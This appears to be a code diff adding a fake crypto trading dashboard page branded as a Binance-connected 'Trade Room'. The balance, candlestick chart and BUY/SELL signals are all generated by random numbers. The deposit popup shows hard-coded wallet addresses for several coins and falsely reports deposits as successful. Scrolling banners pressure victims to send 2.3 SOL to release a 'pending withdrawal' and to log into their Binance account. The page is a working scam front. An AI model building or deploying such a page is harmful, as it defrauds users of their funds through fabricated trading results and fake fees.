@@ -1,0 +1,675 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Binance Wallet Connect Trade Room</title>
+<link rel="stylesheet" href="style.css">
+<style>
+/* ================= SIGNAL + CHART ================= */
+.signal{
+  margin:14px;
+  background:var(--bg-card-2);
+  border-radius:16px;
+  padding:14px;
+  color:var(--text-main);
+}
+.signal-top{
+  display:flex;
+  justify-content:space-between;
+}
+.price .p{
+  font-size:18px;
+  font-weight:bold;
+}
+.chg.up{ color:var(--green); }
+.chg.down{ color:var(--red); }
+
+.chartWrap{
+  margin:14px;
+  background:var(--bg-card-2);
+  border-radius:18px;
+  overflow:hidden;
+}
+canvas{
+  width:100%;
+  height:320px;
+  display:block;
+}
+
+/* ================= BALANCE + HISTORY ================= */
+#balance{
+  font-size:28px;
+  font-weight:700;
+  font-variant-numeric: tabular-nums;
+  margin:6px 0;
+  transition:.3s;
+}
+.balance-up{ color:var(--green); }
+.balance-down{ color:var(--red); }
+
+.history-card{
+  margin:14px;
+  padding:12px;
+  background:var(--bg-card-2);
+  border-radius:12px;
+}
+
+/* ================= DEPOSIT POPUP ================= */
+.popup{
+  position:fixed;
+  top:0; left:0;
+  width:100%; height:100%;
+  background:rgba(0,0,0,.7);
+  display:none;
+  justify-content:center;
+  align-items:center;
+  z-index:999;
+}
+.popup-box{
+  background:var(--bg-card);
+  padding:20px;
+  width:90%;
+  max-width:400px;
+  border-radius:12px;
+  text-align:center;
+  color:var(--text-main);
+  body.popup-open{
+  overflow:hidden;
+}
+.wallet-box{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  background:var(--bg-card-2);
+  padding:8px;
+  border-radius:6px;
+  margin-bottom:10px;
+  font-size:12px;
+  word-break:break-all;
+}
+.copy-btn{ cursor:pointer; font-size:14px; }
+
+/* ================= PROGRESS BAR ================= */
+.deposit-progress-container{
+  position:relative;
+  width:100%;
+  height:20px;
+  background:var(--bg-card-2);
+  border-radius:10px;
+  overflow:hidden;
+  margin:10px 0;
+}
+.deposit-progress-bar{
+  height:100%;
+  width:0%;
+  background:var(--green);
+  border-radius:10px 0 0 10px;
+  transition: width 0.2s linear;
+  text-align:center;
+  color:#fff;
+  font-size:12px;
+  line-height:20px;
+}
+
+/* ================= BUTTONS ================= */
+.btn-group, .trade-controls{
+  display:flex;
+  gap:12px;
+  margin:14px;
+}
+.btn, .trade-controls button{
+  flex:1;
+  padding:12px;
+  border-radius:8px;
+  font-weight:600;
+  cursor:pointer;
+  border:none;
+  transition:.2s;
+}
+.btn-yellow{ background:var(--yellow); color:#000; }
+.btn-dark{ background:var(--bg-card); color:var(--text-main); border:1px solid var(--border); }
+.btn-dark:hover{ background:var(--bg-card-2); }
+
+/* ================= LOADER ================= */
+.loader{
+  position:fixed;
+  inset:0;
+  background:rgba(11,14,17,.95);
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  z-index:9999;
+}
+.loader p{
+  margin-top:12px;
+  font-size:14px;
+  color:var(--text-muted);
+}
+.hidden{ display:none; }
+.spinner{
+  width:42px;
+  height:42px;
+  border:3px solid var(--border);
+  border-top:3px solid var(--yellow);
+  border-radius:50%;
+  animation:spin .8s linear infinite;
+}
+@keyframes spin{ to{ transform:rotate(360deg); } }
+
+/* ================= BLINK ================= */
+@keyframes blink{ from{opacity:1;} to{opacity:0.5;} }
+}
+  .trade-alert-bar{
+  width:100%;
+  height:40px;
+  background:#000;
+  overflow:hidden;
+  position:relative;
+}
+
+.trade-alert-text{
+  position:absolute;
+  white-space:nowrap;
+  font-size:15px;
+  font-weight:600;
+  color:#00ff88;
+  animation:tickerMove 25s linear infinite;
+}
+
+@keyframes tickerMove{
+  0%{
+    transform:translateX(-100%);
+  }
+  100%{
+    transform:translateX(100%);
+  }
+}
+
+/* TICKER AREA */
+
+.ticker-wrap{
+  width:100%;
+  overflow:hidden;
+}
+  /* ANIMATIONS */
+
+@keyframes scrollTicker{
+  0%{transform:translateX(0);}
+  100%{transform:translateX(-100%);}
+}
+
+@keyframes blink{
+  0%,100%{opacity:1;}
+  50%{opacity:0.3;}
+}
+
+@keyframes pulse{
+  0%{box-shadow:0 0 0 0 rgba(255,0,0,0.7);}
+  70%{box-shadow:0 0 0 8px rgba(255,0,0,0);}
+  100%{box-shadow:0 0 0 0 rgba(255,0,0,0);}
+}
+  /* MARKET UPDATE ALERT */
+
+.market-update-alert{
+  margin-top:12px;
+  background:#1a0000;
+  border:2px solid red;
+  border-radius:12px;
+  padding:12px;
+  text-align:center;
+  animation:marketPulse 2s infinite;
+}
+
+.market-update-title{
+  color:red;
+  font-weight:bold;
+  font-size:18px;
+}
+
+.market-update-message{
+  color:#fff;
+  font-size:14px;
+}
+
+.market-update-message a{
+  color:red;
+  font-weight:bold;
+  text-decoration:none;
+}
+
+@keyframes marketPulse{
+  0%{box-shadow:0 0 5px red;}
+  50%{box-shadow:0 0 20px red;}
+  100%{box-shadow:0 0 5px red;}
+}
+
+  </style>
+</head>
+<body class="dark">
+
+<!-- ================= HEADER ================= -->
+<header class="header">
+  <div class="logo">TradeRoom</div>
+  <p>SOL:9PMiUwH1wsZj8ja98B3V6pNGSzt
+    2ZaKU9t2c814JhQxm 
+    STATUS
+    (connected )</p>
+  <button id="themeToggle" class="theme-btn"></button>
+</header>
+
+<!-- ================= BALANCE ================= -->
+<div class="balance-card">
+  <div class="balance-title">Total Balance:</div>
+  <div id="balance">$500.07</div>
+</div>
+
+<!-- ================= TRADE CONTROLS ================= -->
+<div class="trade-controls">
+  <button onclick="startStopTrade()" class="btn-yellow">Start / Stop Trade</button>
+  <button onclick="cancelTrade()" class="btn-dark">CANCEL Trade</button>
+
+  <button onclick="openLiquidation()" class="btn-dark">Liquidation Signal</button>
+
+  <select id="pair" class="btn-dark">
+    <option>SOL/USDT</option>
+    <option>ETH/USDT</option>
+    <option>BTC/USDT</option>
+    <option>ADA/USDT</option>
+    <option>XRP/USDT</option>
+    <option>DOGE/USDT</option>
+    <option>DOT/USDT</option>
+    <option>LTC/USDT</option>
+    <option>AVAX/USDT</option>
+    <option>TRX/USDT</option>
+  </select>
+</div>
+  
+
+<!-- ================= SIGNAL ================= -->
+<div class="signal">
+  <!-- MARKET UPDATE STOP SESSION ALERT -->
+<div class="market-alert">
+  <div class="alert-title">🚨 MARKET UPDATE TO STOP SESSION 🚨</div>
+  <div class="alert-message">
+    Login your linked Binance email for accurate time update:
+    <a href="https:" target="_blank">GO TO YOUR BINANCE APP</a>
+  </div>
+</div>
+  <div class="signal-top">
+    <div>
+      <h2 id="signalText">Signal: BUY</h2>
+      <small id="signalDesc">Confidence: 80%</small>
+    </div>
+    <div class="price">
+      <div class="p" id="signalPrice">50000</div>
+      <div class="chg up" id="signalChange">+0.00%</div>
+    </div>
+  </div>
+  <button class="btn-dark" onclick="toggleMarketMode()">Change Market Mode</button>
+  <!-- TRADING SIGNAL UPDATE TICKER -->
+<div class="trade-alert-bar">
+  <div class="trade-alert-text">
+    NOTICE:DO NOT MAKE FURTHER DEPOSITS AGAIN TRADE ROOM CLOSED PROCEED TO WITHDRAWAL!!!   
+  </div> 
+</div>
+</div>
+<!-- ================= CHART ================= -->
+<div class="chartWrap">
+  <canvas id="chart"></canvas>
+</div>
+
+<!-- ================= DEPOSIT ================= -->
+<div class="balance-card">
+  <h3>Deposit (Advanced Fixed Deposit Security)</h3>
+  <h4>Fixed Capital:$500.07  [3'Net Capital $620] ! </h4>
+  <button class="btn-yellow" onclick="openDeposit()">Make Deposit</button>
+</div>
+
+<!-- ================= HISTORY ================= -->
+<div class="history-card">
+  <h3>Transaction History</h3>
+  <ul id="history"></ul>
+</div>
+
+<!-- ================= NAV BUTTONS ================= -->
+<div class="btn-group">
+  <button class="btn-dark" onclick="redirectWithLoader('withdrawal.html')">Withdrawal</button>
+  <button class="btn-dark" onclick="redirectWithLoader('home.html')">Dashboard</button>
+</div>
+
+<!-- ================= DEPOSIT POPUP ================= -->
+<div class="popup" id="depositPopup">
+  <div class="popup-box">
+    <h3>Select Network</h3>
+    <select id="networkSelect" onchange="updateWallet()">
+      <option value="USDT-ERC20">USDT (ERC20)</option>
+      <option value="USDT-TRC20">USDT (TRC20)</option>
+      <option value="SOL">SOL</option>
+      <option value="BTC">BTC</option>
+      <option value="BNB">BNB</option>
+    </select>
+
+    <div class="wallet-box">
+      <span id="walletAddress"></span>
+      <span class="copy-btn" onclick="copyWallet()">📋</span>
+    </div>
+
+    <input type="number" id="depositAmount" placeholder="Enter amount">
+    <button onclick="confirmDeposit()" class="btn-yellow">Confirm Deposit</button>
+
+    <!-- Progress Bar -->
+    <div class="deposit-progress-container">
+      <div class="deposit-progress-bar" id="depositProgressBar">10</div>
+    </div>
+
+    <button onclick="closeDeposit()" class="btn-dark">Close</button>
+  </div>
+</div>
+  </div>
+<div class="popup" id="liquidationPopup">
+  <div class="popup-box">
+
+    <h3>Liquidation Signal</h3>
+
+    <input id="liqAmount" placeholder="Amount">
+    <input id="liqValue" placeholder="Value">
+    <input id="liqPercent" placeholder="Target Percentage">
+
+    <button onclick="startLiquidation()" class="btn-yellow">Confirm</button>
+
+    <div class="deposit-progress-container">
+      <div class="deposit-progress-bar" id="liqBar">0%</div>
+    </div>
+
+    <div id="liqResult" style="margin-top:10px;font-size:14px;"></div>
+
+    <button onclick="closeLiquidation()" class="btn-dark">Close</button>
+
+  </div>
+</div>
+<!-- ================= LOADER ================= -->
+<div id="loader" class="loader hidden">
+  <div class="spinner"></div>
+  <p>Redirecting...</p>
+  <!-- ===== TRADING SIGNAL ALERT BAR ===== -->
+
+<div class="trade-alert-bar">
+
+  <div class="alert-left">
+    <span class="alert-icon">🚨</span>
+    <span class="live-dot"></span>
+  </div>
+
+  <div class="ticker-wrap">
+    <div class="ticker-move">
+      NOTICE:ALERT UPDATE FOR TAP OUT WITHDRAWAL PENDING  "LOW INDEX DEPOSIT".. (warning: you need 2.3 SOL to update correctly) 
+    </div>
+  </div>
+
+</div>
+
+<script>
+// ================= WALLET =================
+let wallets = {
+ "USDT-ERC20":"0xe5bc64a8ecb7e9be8161010959d20570968add91",
+ "USDT-TRC20":"TY3GGqzDi9sSivC8Y9WnsKS8KYVa599WkE",
+ "SOL":"E9iGT7beby9DEsGxPM3t4xJMjDKkR6fTuHriwjH3uUKy",
+ "BTC":"15GJLYrc7j2ywhWuQEH1JdDK4UGrprnrLG",
+ "BNB":"0xe5bc64a8ecb7e9be8161010959d20570968add91"
+};
+function openDeposit(){ 
+  document.getElementById("depositPopup").style.display="flex"; 
+  updateWallet(); 
+}
+function closeDeposit(){ 
+  document.getElementById("depositPopup").style.display="none"; 
+  resetProgressBar();
+}
+function updateWallet(){ document.getElementById("walletAddress").innerText = wallets[document.getElementById("networkSelect").value]; }
+function copyWallet(){ navigator.clipboard.writeText(document.getElementById("walletAddress").innerText); alert("Wallet Address Copied!"); }
+
+// ================= BALANCE =================
+let balanceEl = document.getElementById("balance");
+let historyEl = document.getElementById("history");
+let balance = parseFloat(localStorage.getItem("balance"))||500;
+balanceEl.innerText="$"+balance.toFixed(2);
+window.tradingRunning=true;
+window.tradingHold=false;
+
+// ================= HISTORY =================
+function saveHistory(text){
+ let list = JSON.parse(localStorage.getItem("history"))||[];
+ list.push(text+" | "+new Date().toLocaleTimeString());
+ localStorage.setItem("history",JSON.stringify(list));
+ loadHistory();
+}
+function loadHistory(){
+ historyEl.innerHTML="";
+ let list = JSON.parse(localStorage.getItem("history"))||[];
+ list.forEach(item=>historyEl.innerHTML+=`<li>${item}</li>`);
+}
+loadHistory();
+function updateBalanceEl(){ balanceEl.innerText="$"+balance.toFixed(2); }
+
+// ================= LIVE BALANCE =================
+function liveBalanceTick(){
+ if(!window.tradingRunning || window.tradingHold) return;
+ let move=(Math.random()*2)*balance*0.002;
+ if(Math.random()<0.25) move*=-1;
+ balance += move;
+ localStorage.setItem("balance", balance);
+ balanceEl.classList.remove("balance-up","balance-down");
+ balanceEl.classList.add(move>=0?"balance-up":"balance-down");
+ updateBalanceEl();
+}
+setInterval(liveBalanceTick,1000);
+
+// ================= CANCEL / START TRADE =================
+
+// Initialize trading state from localStorage
+window.tradingRunning = localStorage.getItem("tradingRunning") === "false" ? false : true;
+window.tradingHold = false;
+
+// Update Start / Stop function
+function startStopTrade() { 
+    window.tradingRunning = !window.tradingRunning;
+    localStorage.setItem("tradingRunning", window.tradingRunning); // save state
+    updateTradeButtonLabel();
+}
+
+// Cancel trade function stays mostly the same
+function cancelTrade(){
+  balance = 500;
+  localStorage.setItem("balance", balance);
+  updateBalanceEl();
+  window.tradingRunning = false;
+  window.tradingHold = false;
+  localStorage.setItem("tradingRunning", false); // make sure state is saved
+  saveHistory("Trade CANCELLED | Balance Reset to $500");
+}
+
+// Optional: update Start/Stop button label dynamically
+function updateTradeButtonLabel() {
+    const btn = document.querySelector(".btn-yellow");
+    if(btn) btn.textContent = window.tradingRunning ? "Stop Trade" : "Start Trade";
+}
+
+// Call once on page load to set the correct label
+updateTradeButtonLabel();
+// ================= CHART + SIGNAL =================
+const canvas=document.getElementById("chart");
+const ctx=canvas.getContext("2d");
+canvas.width=canvas.offsetWidth; canvas.height=320;
+let candles=[],maxCandles=40,basePrice=50000,marketMode="Normal";
+let pairVolatility={"BTC/USDT":120,"ETH/USDT":80,"SOL/USDT":60,"ADA/USDT":40,"XRP/USDT":35,"DOGE/USDT":30,"DOT/USDT":45,"LTC/USDT":55,"AVAX/USDT":70,"TRX/USDT":25};
+let modeMultiplier={"Calm":0.5,"Normal":1,"Volatile":2};
+function toggleMarketMode(){ marketMode = marketMode==="Calm"?"Normal":marketMode==="Normal"?"Volatile":"Calm"; }
+function generateCandle(){ 
+  let pair=document.getElementById("pair").value;
+  let vol = pairVolatility[pair]*modeMultiplier[marketMode];
+  let open=basePrice, close=open+(Math.random()-0.5)*vol;
+  let high=Math.max(open,close)+Math.random()*vol/2;
+  let low=Math.min(open,close)-Math.random()*vol/2;
+  basePrice=close; candles.push({open,close,high,low});
+  if(candles.length>maxCandles)candles.shift();
+}
+function drawChart(){
+ ctx.clearRect(0,0,canvas.width,canvas.height);
+ let max=Math.max(...candles.map(c=>c.high)), min=Math.min(...candles.map(c=>c.low)), w=canvas.width/maxCandles;
+ candles.forEach((c,i)=>{
+   let x=i*w+w/4, scale=canvas.height/(max-min||1);
+   let openY=canvas.height-(c.open-min)*scale;
+   let closeY=canvas.height-(c.close-min)*scale;
+   let highY=canvas.height-(c.high-min)*scale;
+   let lowY=canvas.height-(c.low-min)*scale;
+   ctx.strokeStyle=c.close>c.open?"#00c087":"#f6465d";
+   ctx.fillStyle=ctx.strokeStyle;
+   ctx.beginPath(); ctx.moveTo(x+w/4,highY); ctx.lineTo(x+w/4,lowY); ctx.stroke();
+   ctx.fillRect(x,Math.min(openY,closeY),w/2,Math.abs(openY-closeY)||2);
+ });
+}
+function updateSignal(){
+ if(candles.length<2)return;
+ let last=candles[candles.length-1], prev=candles[candles.length-2];
+ let change=last.close-prev.close;
+ let confidence=Math.floor(Math.random()*20)+75;
+ document.getElementById("signalPrice").innerText=Math.round(last.close);
+ let chgEl=document.getElementById("signalChange");
+ if(change>0){
+   document.getElementById("signalText").innerText="Signal: BUY";
+   chgEl.innerText="+"+change.toFixed(2);
+   chgEl.className="chg up";
+ }else{
+   document.getElementById("signalText").innerText="Signal: SELL";
+   chgEl.innerText=change.toFixed(2);
+   chgEl.className="chg down";
+ }
+ document.getElementById("signalDesc").innerText="Confidence: "+confidence+"% | Mode: "+marketMode;
+}
+function animate(){ generateCandle(); drawChart(); updateSignal(); setTimeout(animate,1200); }
+animate();
+
+// ================= DEPOSIT WITH PROGRESS BAR =================
+function resetProgressBar(){
+  const bar=document.getElementById("depositProgressBar");
+  bar.style.width="0%";
+  bar.textContent="100s";
+}
+function confirmDeposit(){
+  let amount=parseFloat(document.getElementById("depositAmount").value);
+  if(!amount||amount<=0) return;
+  
+  const bar=document.getElementById("depositProgressBar");
+  let countdown=100;
+  bar.style.width="0%";
+  bar.textContent=`${countdown}s`;
+  
+  const interval = setInterval(()=>{
+    countdown--;
+    bar.style.width = ((100-countdown)/100*100)+"%";
+    bar.textContent = countdown>0? `${countdown}s` : "Depositing...";
+    if(countdown<=0){
+      clearInterval(interval);
+      balance += amount;
+      localStorage.setItem("balance", balance);
+      saveHistory(`Deposit +${amount}`);
+      updateBalanceEl();
+      bar.style.width="100%";
+      bar.textContent="Deposit Successful!";
+      setTimeout(()=>closeDeposit(),1500);
+    }
+  },1000);
+}
+
+// ================= REDIRECT WITH LOADER =================
+function redirectWithLoader(url){
+  const loader = document.getElementById("loader");
+  loader.classList.remove("hidden");
+  setTimeout(()=> window.location.href = url, 1500);
+}
+
+// ================= THEME =================
+document.addEventListener("DOMContentLoaded",()=>{
+  const theme = localStorage.getItem('theme');
+  if(theme) document.body.className = theme;
+
+  const themeBtn = document.getElementById("themeToggle");
+  if(themeBtn){
+    const systemDark = window.matchMedia("(prefers-color-scheme: dark)").matches;
+    if(!theme) document.body.classList.toggle("dark", systemDark);
+    updateThemeText();
+    themeBtn.addEventListener("click",()=>{
+      document.body.classList.toggle("dark");
+      localStorage.setItem("theme",document.body.className);
+      updateThemeText();
+    });
+  }
+});requireLogin();
+updateBalanceUI();
+loadHistory();
+function updateThemeText(){
+  const themeBtn=document.getElementById("themeToggle");
+  if(!themeBtn) return;
+  themeBtn.textContent = document.body.classList.contains("dark") ? "☀️ Light" : "🌙 Dark";
+}
+  // ================= LIQUIDATION SIGNAL =================
+
+function openDeposit(){
+  document.getElementById("depositPopup").style.display="flex";
+  document.body.classList.add("popup-open");
+  updateWallet();
+}
+
+function closeDeposit(){
+  document.getElementById("depositPopup").style.display="none";
+  document.body.classList.remove("popup-open");
+}
+
+function openLiquidation(){
+  document.getElementById("liquidationPopup").style.display="flex";
+  document.body.classList.add("popup-open");
+}
+
+function closeLiquidation(){
+  document.getElementById("liquidationPopup").style.display="none";
+  document.body.classList.remove("popup-open");
+}
+
+function startLiquidation(){
+
+ let amount=document.getElementById("liqAmount").value
+ let value=document.getElementById("liqValue").value
+ let target=parseInt(document.getElementById("liqPercent").value)
+
+ let bar=document.getElementById("liqBar")
+ let result=document.getElementById("liqResult")
+
+ let progress=0
+
+ let run=setInterval(()=>{
+
+  progress++
+
+  bar.style.width=progress+"%"
+  bar.innerText=progress+"%"
+
+  if(progress>=target){
+
+    clearInterval(run)
+
+    result.innerHTML=
+    "Amount: "+amount+"<br>"+
+    "Value: "+value+"<br>"+
+    "Percentage: "+target+"%<br><br>"+
+    "<b style='color:#00c087'>Accurate Streaming</b>"
+
+  }
+
+ },30)
+
+  }
+</script>
+</body>
+</html> 
